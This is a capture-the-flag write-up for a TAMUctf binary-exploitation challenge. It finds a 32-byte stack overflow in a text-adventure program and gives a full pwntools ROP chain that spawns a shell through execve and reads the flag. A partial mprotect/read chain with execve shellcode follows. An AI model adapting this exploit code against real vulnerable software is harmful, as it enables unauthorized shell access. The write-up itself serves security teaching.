The binary has the following protections set and is statically linked:

```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
We're greeted by a text adventure style game with a number of inputs.  
```
Welcome to the TAMU Text Adventure!
You are about to begin your journey at Texas A&M as a student
But first tell me a little bit about yourself
What is your first name?: 
```
The first set of inputs do not appear vulnerable to overflow, as they appear to accept fixed length buffer.  However, the `change your major` option will segfault when given a large input.
```
What is your first name?: 
What is your last name?: 
What is your major?: 
Are you joining the Corps of Cadets?(y/n): y

Welcome, 
 
, to Texas A&M!
You wake with a start as your sophomore yells "Wake up fish 
! Why aren't you with your buddies in the fallout hole?"
As your sophomore slams your door close you quickly get dressed in pt gear and go to the fallout hole.
You spend your morning excersizing and eating chow.
Finally your first day of class begins at Texas A&M. What do you decide to do next?(Input option number)
1. Go to class.
2. Change your major.
3. Skip class and sleep
4. Study
2
You decide that you are already tired of studying 
 and go to the advisors office to change your major
What do you change your major to?: 
```
We input a pattern to find the point at which we get EIP overwrite
```gdb
0x41412941 in ?? ()
gdb-peda$ pattern offset 0x41412941
1094789441 found at offset: 32
```

This one was honestly quite tricky.  The remote binary failed to correctly buffer it's input, so any commands sent wouldn't return any output.  This made the range of options much more limited. 

Since the binary is statically linked, a number of useful functions aren't compiled into the binary, and we can't perform a ret2libc anyway.  I noticed the `read` and `mprotect` functions were available, so I attempted to use the `read` function to write a '/bin/sh' string to 

Given the buffer issues however this worked locally, but not remotely.  Instead we can use two gadgets to pop wanted values into two registers and a `mov [ecx], edx` gadget to achieve arbitrary memory write.  We write these into the .bss binary section.
```python
from pwn import *
r = remote('pwn.ctf.tamu.edu', 4325)

r.sendline('')
r.sendline('')
r.sendline('')
r.sendline('y')
r.sendline('2')

mov_gadget = 0x8067f91  #  mov [ecx],edx; pop ebx; ret
pop_gadget = 0x080733b0 # pop edx; pop ecx; pop ebx; ret

bss_addr = 0x080f0f80

pop_ebx  = 0x0806b400   # pop ebx; ret;
pop_ecx  = 0x080e4325   # pop ecx; ret;
pop_edx  = 0x080ea949   # pop edx; ret;
pop_eax  = 0x080bc396   # pop eax; ret;
int_x80  = 0x08073990   # int 0x80

rop = p32(pop_gadget)
rop += '/bin'
rop += p32(bss_addr)
rop += p32(0x0)

rop += p32(mov_gadget)
rop += p32(0x0)

rop += p32(pop_gadget)
rop += '/sh\x00'
rop += p32(bss_addr+4)
rop += p32(0x0)

rop += p32(mov_gadget)
rop += p32(0x0)

rop += p32(pop_ebx) 					# pop ebx; ret;
rop += p32(bss_addr) 					# .bss

rop += p32(pop_ecx)  				    # pop ecx; ret;
rop += p32(0x0)							# No args please

rop += p32(pop_edx) 					# pop edx; ret;
rop += p32(0x0)							# No args please

rop += p32(pop_eax)	# pop eax; ret;
rop += p32(11)							# exec syscall value
rop += p32(int_x80) # int 0x80

buf = 'A'*32 + rop

r.sendline(buf)
r.interactive()
```

Running the above and we're returned a shell!

```
root@kali:~/Desktop/tamuctf# python pwn5_test.py 
[+] Opening connection to pwn.ctf.tamu.edu on port 4325: Done
[*] Switching to interactive mode
$ id
uid=1000(pwnuser) gid=1001(pwnuser) groups=1001(pwnuser),1000(ctf)
$ cat flag.txt
gigem{r37urn_0f_7h3_pwn}
```
The read ROP chain (which worked locally but not remotely), sets the .bss location as executable using ret2mprotect, and then uses `read` to allow us to write a payload into that section, which we then jump to:
```python
read_func = 0x8071950
bss_addr = 0x8048000
pop3ret = 0x80483e8
mprotect = 0x8072450

#classic execve payload
payload='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

rop  = p32(mprotect)
rop += p32(pop3ret)
rop += p32(bss_addr)
rop += p32(0x121)
rop += p32(0x7)

rop += p32(read_func)
rop += p32(bss_addr)
rop += p32(0x0)
rop += p32(bss_addr)
rop += p32(len(payload))
```
